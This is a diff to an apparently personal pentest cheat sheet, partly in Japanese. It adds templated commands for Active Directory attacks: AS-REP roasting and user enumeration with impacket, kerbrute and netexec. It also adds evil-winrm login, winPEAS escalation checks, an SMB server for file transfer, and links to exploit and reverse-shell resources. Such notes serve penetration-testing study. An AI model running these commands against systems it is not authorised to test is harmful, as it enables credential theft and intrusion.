@@ -5,22 +5,30 @@
 
 
 ## 88
-impacket
+### impacket
 ```sh
 # userenum & asreproast
 impacket-GetNPUsers -outputfile 'OUTPUT.txt' -ts -dc-ip 'IP' -usersfile 'USERLIST' 'DOMAINNAME'
 impacket-GetNPUsers -outputfile 'OUTPUT.txt' -ts -dc-ip 'IP' -no-pass 'DOMAINNAME/USERNAME'
 ```
-kerbrute
+### kerbrute
 ```sh
 # userenum
 ./kerbrute_linux_amd64 userenum --dc 'IP' -d 'DOMAINNAME' 'USERLIST'
 ```
-netexec
+### netexec
 ```sh
 # ASREPRoast (TCP389番も必要)
 netexec ldap 'IP' -u 'USERNAMELIST' -p '' --asreproast 'OUTPUT.txt'
 netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --asreproast 'OUTPUT.txt'
+```
+
+
+
+## 123 (UDP)
+### ntpdate
+```sh
+sudo ntpdate 'IP'
 ```
 
 
@@ -135,14 +143,58 @@ smbmap -H 'IP or FQDN' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -r '
 ```
 
 
+
+## 5985
+### evil-winrm
+```sh
+evil-winrm -i 'IP' -u 'USERNAME' -p 'PASSWORD'
+```
+
+
+
+## escalation
+### windows
+#### winpeas
+```bat
+.\winPEASx64.exe userinfo quiet
+```
+
+
+
+## kali
+### impacket-smbserver
+```sh
+impacket-smbserver 'SHARENAME' 'PATH'
+# smbv1が無効の場合は
+impacket-smbserver -smb2support 'SHARENAME' 'PATH'
+```
+
+
 ## link
-https://github.com/kavika13/RemCom
+- https://book.hacktricks.wiki/en/index.html
+- https://cwe.mitre.org/data/published/cwe_latest.pdf
+- https://exploit-notes.hdks.org/
+- https://github.com/abatchy17/WindowsExploits
+- https://github.com/SecWiki/windows-kernel-exploits
+- https://github.com/swisskyrepo/InternalAllTheThings
+- https://github.com/swisskyrepo/PayloadsAllTheThings
+- https://gtfobins.github.io/
+- https://hideandsec.sh/books
+- https://infra.newerasec.com/
+- https://juggernaut-sec.com/
+- https://kashz.gitbook.io/kashz-jewels
+- https://morgan-bin-bash.gitbook.io/pentesting/
+- https://www.hackingarticles.in/
+- https://www.revshells.com/
+- a
+- https://github.com/kavika13/RemCom
+- https://www.hyhforever.top/
+
 
 
 ## list
 ### generate wordlist
 https://github.com/urbanadventurer/username-anarchy
-
 ### seclists
 ```sh
 └─$ find /usr/share/seclists/Usernames -type f -exec wc -l {} +
